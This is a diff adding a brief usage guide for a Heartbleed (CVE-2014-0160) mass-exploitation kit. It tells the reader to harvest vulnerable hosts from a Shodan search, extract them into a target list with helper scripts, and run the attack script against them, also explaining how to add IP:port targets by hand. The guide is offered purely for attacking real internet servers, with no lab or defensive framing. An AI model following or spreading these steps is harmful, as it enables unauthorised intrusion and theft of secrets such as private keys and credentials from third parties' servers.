@@ -1,0 +1,12 @@
+Exploitation of HeartBleed vuln
+
+1) Make shodan search (i.e "vuln:CVE-2014-0160")
+2) Get source code, copy it
+3) Paste it in file in Bleed directory, lets name it "source.html"
+4) ./setup.sh
+5) ./addTargetsFromSource.sh source.html targets.txt
+6) ./always targets.txt
+
+You can also manually add your targets by adding your IPs to targets.txt (format ip:port) like
+192.168.0.1:80
+Please note that 443 is default.
